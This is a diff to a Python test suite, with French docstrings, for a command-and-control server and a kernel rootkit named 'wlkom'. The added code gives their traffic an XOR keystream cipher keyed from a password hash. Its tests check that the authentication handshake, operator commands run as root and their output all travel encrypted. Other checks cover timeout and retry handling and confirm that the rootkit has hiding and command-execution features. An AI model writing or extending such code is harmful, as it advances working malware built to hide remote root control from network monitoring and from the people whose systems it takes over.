@@ -76,10 +76,43 @@ def fnv1a_hash(text):
     return f"{value:08x}"
 
 
+def cipher_key(text):
+    return int(fnv1a_hash(text), 16)
+
+
+def keystream_byte(key, pos):
+    value = (key + pos * 0x9E3779B1) & 0xffffffff
+    value ^= value >> 16
+    value = (value * 0x85ebca6b) & 0xffffffff
+    value ^= value >> 13
+    value = (value * 0xc2b2ae35) & 0xffffffff
+    value ^= value >> 16
+    return value & 0xff
+
+
+def crypt_bytes(data, key, start_pos=0):
+    return bytes(
+        byte ^ keystream_byte(key, start_pos + index)
+        for index, byte in enumerate(data)
+    )
+
+
+def recv_exact(sock, size):
+    data = b""
+    while len(data) < size:
+        chunk = sock.recv(size - len(data))
+        if not chunk:
+            raise AssertionError(f"socket closed while reading {size} bytes; got {data!r}")
+        data += chunk
+    return data
+
+
 def test_c2_sends_auth_hash():
-    """Lance le C2, se connecte en TCP et vérifie que la première trame reçue est AUTH <hash_fnv1a>."""
+    """Lance le C2, se connecte en TCP et vérifie que la première trame chiffrée contient AUTH <hash_fnv1a>."""
     port = free_port()
     password = "secret-test"
+    key = cipher_key(password)
+    expected = f"AUTH {fnv1a_hash(password)}\n".encode()
     proc = subprocess.Popen(
         [str(C2_BIN), str(port)],
         text=True,
@@ -92,11 +125,13 @@ def test_c2_sends_auth_hash():
         with socket.create_connection(("127.0.0.1", port), timeout=3.0) as sock:
             proc.stdin.write(f"{password}\n")
             proc.stdin.flush()
-            data = sock.recv(128)
-        expected = f"AUTH {fnv1a_hash(password)}\n".encode()
-        if data != expected:
-            fail("c2 sends AUTH hash", f"expected {expected!r}, got {data!r}")
-        ok("c2 sends AUTH hash")
+            data = recv_exact(sock, len(expected))
+        if data == expected:
+            fail("c2 sends encrypted AUTH hash", "AUTH frame was sent in plaintext")
+        decrypted = crypt_bytes(data, key)
+        if decrypted != expected:
+            fail("c2 sends encrypted AUTH hash", f"expected decrypted {expected!r}, got {decrypted!r}")
+        ok("c2 sends encrypted AUTH hash")
     finally:
         proc.terminate()
         try:
@@ -182,6 +217,9 @@ def test_c2_fnv1a_source():
         ("hash ^= (unsigned char)*str", "FNV-1a xor step"),
         ("hash *= FNV1A_PRIME", "FNV-1a multiply step"),
         ("AUTH %08x\\n", "AUTH frame sends fixed-width hex hash"),
+        ("AUTH_REPLY_TIMEOUT_SEC", "C2 has an authentication reply timeout"),
+        ("write_encrypted", "C2 encrypts outbound protocol frames"),
+        ("read_encrypted_line", "C2 decrypts line-based replies"),
         ("strcmp(auth_reply, \"AUTH_OK\")", "C2 waits for the module authentication acknowledgement"),
     ]
     for pattern, description in checks:
@@ -195,8 +233,13 @@ def test_wlkom_password_auth_source():
     checks = [
         ('module_param(password_hash, charp, 0400);', "non-hardcoded password hash module parameter"),
         ("password_hash[0] == '\\0'", "empty-password-hash rejection"),
+        ("kstrtouint(password_hash, 16, &cipher_key)", "password hash parsed as cipher key"),
+        ("crypt_buffer(&buf[pos], 1, cipher_key, &rx_pos)", "rootkit decrypts inbound protocol bytes"),
+        ("crypt_buffer(tmp, chunk, cipher_key", "rootkit encrypts outbound protocol bytes"),
         ('#define AUTH_PREFIX "AUTH "', "AUTH protocol prefix"),
-        ('recv_line(buf, sizeof(buf))', "line-based auth receive"),
+        ("#define AUTH_FRAME_LEN", "fixed-length encrypted AUTH frame"),
+        ("recv_auth_frame(buf, sizeof(buf))", "auth receive does not depend on encrypted newline framing"),
+        ("buf[AUTH_PREFIX_LEN + AUTH_HASH_LEN] != '\\n'", "AUTH frame newline validation"),
         ('strncmp(buf, AUTH_PREFIX, AUTH_PREFIX_LEN)', "AUTH prefix validation"),
         ('strcmp(received_hash, password_hash)', "password hash comparison"),
         ('send_reply("AUTH_OK\\n")', "successful authentication acknowledgement"),
@@ -206,6 +249,24 @@ def test_wlkom_password_auth_source():
     for pattern, description in checks:
         require_source(pattern, description, source, "wlkom password/auth source checks")
     ok("wlkom password/auth source checks")
+
+
+def test_wlkom_cipher_state_source():
+    """Vérifie que wlkom chiffre les deux sens et réinitialise les compteurs par session TCP."""
+    source = WLKOM_C.read_text()
+    checks = [
+        ("static u32                 cipher_key", "rootkit stores cipher key"),
+        ("static u32                 tx_pos", "rootkit tracks encrypted transmit offset"),
+        ("static u32                 rx_pos", "rootkit tracks encrypted receive offset"),
+        ("keystream_byte(u32 key, u32 pos)", "rootkit keystream helper"),
+        ("crypt_buffer(&buf[pos], 1, cipher_key, &rx_pos)", "receive path decrypts each byte"),
+        ("crypt_buffer(tmp, chunk, cipher_key, &pos)", "send path encrypts chunks"),
+        ("tx_pos += ret", "transmit offset advances only by sent bytes"),
+        ("tx_pos = 0;\n        rx_pos = 0;", "cipher offsets reset on each C2 connection"),
+    ]
+    for pattern, description in checks:
+        require_source(pattern, description, source, "wlkom cipher state source checks")
+    ok("wlkom cipher state source checks")
 
 
 def test_wlkom_exec_source():
@@ -263,10 +324,12 @@ def test_c2_does_not_open_shell_on_auth_rejection():
     try:
         wait_for_line(proc, "C2 listening", timeout=3.0)
         with socket.create_connection(("127.0.0.1", port), timeout=3.0) as sock:
+            key = cipher_key("reject-test")
+            auth_len = len(f"AUTH {fnv1a_hash('reject-test')}\n".encode())
             proc.stdin.write("reject-test\n")
             proc.stdin.flush()
-            sock.recv(128)
-            sock.sendall(b"AUTH_FAIL\n")
+            recv_exact(sock, auth_len)
+            sock.sendall(crypt_bytes(b"AUTH_FAIL\n", key))
         lines = wait_for_line(proc, "Authentication failed", timeout=3.0)
         if any("WLKOM INTERACTIVE SHELL" in line for line in lines):
             fail("c2 hides shell after failed auth", f"unexpected shell output: {lines!r}")
@@ -280,10 +343,10 @@ def test_c2_does_not_open_shell_on_auth_rejection():
             proc.wait(timeout=2.0)
 
 
-def test_c2_detects_idle_disconnect():
-    """Verifie que le C2 detecte une deconnexion rootkit meme sans nouvelle commande operateur."""
+def test_c2_rejects_plaintext_auth_ack():
+    """Vérifie qu'un AUTH_OK en clair n'est pas accepté quand le protocole chiffré est actif."""
     port = free_port()
-    password = "idle-disconnect"
+    password = "plaintext-auth-ok"
     expected_auth = f"AUTH {fnv1a_hash(password)}\n".encode()
 
     proc = subprocess.Popen(
@@ -300,13 +363,105 @@ def test_c2_detects_idle_disconnect():
             proc.stdin.write(f"{password}\n")
             proc.stdin.flush()
 
-            auth_data = b""
-            while b"\n" not in auth_data:
-                auth_data += sock.recv(64)
-            if auth_data != expected_auth:
-                fail("c2 detects idle disconnect", f"unexpected AUTH: {auth_data!r}")
+            auth_data = recv_exact(sock, len(expected_auth))
+            if auth_data == expected_auth:
+                fail("c2 rejects plaintext AUTH_OK", "AUTH request was sent in plaintext")
 
             sock.sendall(b"AUTH_OK\n")
+
+        wait_for_line(proc, "Authentication failed", timeout=3.0)
+        ok("c2 rejects plaintext AUTH_OK")
+    finally:
+        proc.stdin.close()
+        proc.terminate()
+        try:
+            proc.wait(timeout=2.0)
+        except subprocess.TimeoutExpired:
+            proc.kill()
+            proc.wait(timeout=2.0)
+
+
+def test_c2_auth_timeout_allows_retry():
+    """Vérifie qu'une auth sans réponse ne bloque pas le C2 et qu'une reconnexion redemande le mot de passe."""
+    port = free_port()
+    bad_password = "bad-timeout"
+    good_password = "good-after-timeout"
+    bad_auth = f"AUTH {fnv1a_hash(bad_password)}\n".encode()
+    good_auth = f"AUTH {fnv1a_hash(good_password)}\n".encode()
+    good_key = cipher_key(good_password)
+
+    proc = subprocess.Popen(
+        [str(C2_BIN), str(port)],
+        text=True,
+        stdin=subprocess.PIPE,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+    )
+    try:
+        wait_for_line(proc, "C2 listening", timeout=3.0)
+
+        first_sock = socket.create_connection(("127.0.0.1", port), timeout=3.0)
+        try:
+            first_sock.settimeout(3.0)
+            proc.stdin.write(f"{bad_password}\n")
+            proc.stdin.flush()
+            recv_exact(first_sock, len(bad_auth))
+            wait_for_line(proc, "Authentication failed", timeout=6.0)
+            wait_for_line(proc, "Waiting for rootkit connection", timeout=3.0)
+        finally:
+            first_sock.close()
+
+        with socket.create_connection(("127.0.0.1", port), timeout=3.0) as sock:
+            sock.settimeout(3.0)
+            proc.stdin.write(f"{good_password}\n")
+            proc.stdin.flush()
+
+            auth_data = recv_exact(sock, len(good_auth))
+            decrypted_auth = crypt_bytes(auth_data, good_key)
+            if decrypted_auth != good_auth:
+                fail("c2 auth timeout allows retry", f"unexpected AUTH after retry: {decrypted_auth!r}")
+
+            sock.sendall(crypt_bytes(b"AUTH_OK\n", good_key))
+            wait_for_line(proc, "Authentication accepted", timeout=3.0)
+
+        ok("c2 auth timeout allows retry")
+    finally:
+        proc.stdin.close()
+        proc.terminate()
+        try:
+            proc.wait(timeout=2.0)
+        except subprocess.TimeoutExpired:
+            proc.kill()
+            proc.wait(timeout=2.0)
+
+
+def test_c2_detects_idle_disconnect():
+    """Verifie que le C2 detecte une deconnexion rootkit meme sans nouvelle commande operateur."""
+    port = free_port()
+    password = "idle-disconnect"
+    expected_auth = f"AUTH {fnv1a_hash(password)}\n".encode()
+    key = cipher_key(password)
+
+    proc = subprocess.Popen(
+        [str(C2_BIN), str(port)],
+        text=True,
+        stdin=subprocess.PIPE,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+    )
+    try:
+        wait_for_line(proc, "C2 listening", timeout=3.0)
+        with socket.create_connection(("127.0.0.1", port), timeout=3.0) as sock:
+            sock.settimeout(3.0)
+            proc.stdin.write(f"{password}\n")
+            proc.stdin.flush()
+
+            auth_data = recv_exact(sock, len(expected_auth))
+            decrypted_auth = crypt_bytes(auth_data, key)
+            if decrypted_auth != expected_auth:
+                fail("c2 detects idle disconnect", f"unexpected AUTH: {decrypted_auth!r}")
+
+            sock.sendall(crypt_bytes(b"AUTH_OK\n", key))
             wait_for_line(proc, "Authentication accepted", timeout=3.0)
 
         wait_for_line(proc, "Connection lost or rootkit disconnected", timeout=3.0)
@@ -327,6 +482,7 @@ def test_c2_exec_protocol():
     port = free_port()
     password = "test-exec"
     expected_auth = f"AUTH {fnv1a_hash(password)}\n".encode()
+    key = cipher_key(password)
 
     proc = subprocess.Popen(
         [str(C2_BIN), str(port)],
@@ -344,24 +500,24 @@ def test_c2_exec_protocol():
             proc.stdin.write(f"{password}\n")
             proc.stdin.flush()
 
-            auth_data = b""
-            while b"\n" not in auth_data:
-                auth_data += sock.recv(64)
-            if auth_data != expected_auth:
-                fail("c2 exec protocol", f"unexpected AUTH: {auth_data!r}")
+            auth_data = recv_exact(sock, len(expected_auth))
+            decrypted_auth = crypt_bytes(auth_data, key)
+            if decrypted_auth != expected_auth:
+                fail("c2 exec protocol", f"unexpected AUTH: {decrypted_auth!r}")
 
-            sock.sendall(b"AUTH_OK\n")
+            sock.sendall(crypt_bytes(b"AUTH_OK\n", key))
             wait_for_line(proc, "Authentication accepted", timeout=3.0)
             time.sleep(0.2)
 
             proc.stdin.write("id\n")
             proc.stdin.flush()
 
-            cmd_data = b""
-            while b"\n" not in cmd_data:
-                cmd_data += sock.recv(64)
-            if cmd_data.strip() != b"id":
-                fail("c2 exec protocol", f"wrong command received: {cmd_data!r}")
+            cmd_data = recv_exact(sock, len(b"id\n"))
+            if cmd_data == b"id\n":
+                fail("c2 exec protocol", "command was sent in plaintext")
+            decrypted_cmd = crypt_bytes(cmd_data, key, len(expected_auth))
+            if decrypted_cmd.strip() != b"id":
+                fail("c2 exec protocol", f"wrong command received: {decrypted_cmd!r}")
 
             response = (
                 "[Exit Status: 0]\n"
@@ -370,7 +526,9 @@ def test_c2_exec_protocol():
                 "--- STDERR ---\n"
                 "--- End of Output ---\n\n"
             )
-            sock.sendall(response.encode())
+            sock.sendall(crypt_bytes(response.encode(), key, len(b"AUTH_OK\n")))
+
+            wait_for_line(proc, "uid=0(root)", timeout=3.0)
 
             time.sleep(0.2)
             proc.stdin.write("exit\n")
@@ -401,9 +559,12 @@ def main():
         test_c2_fnv1a_source,
         test_c2_sends_auth_hash,
         test_wlkom_password_auth_source,
+        test_wlkom_cipher_state_source,
         test_wlkom_exec_source,
         test_wlkom_hide_module_source,
         test_c2_does_not_open_shell_on_auth_rejection,
+        test_c2_rejects_plaintext_auth_ack,
+        test_c2_auth_timeout_allows_retry,
         test_c2_detects_idle_disconnect,
         test_c2_exec_protocol,
     ]
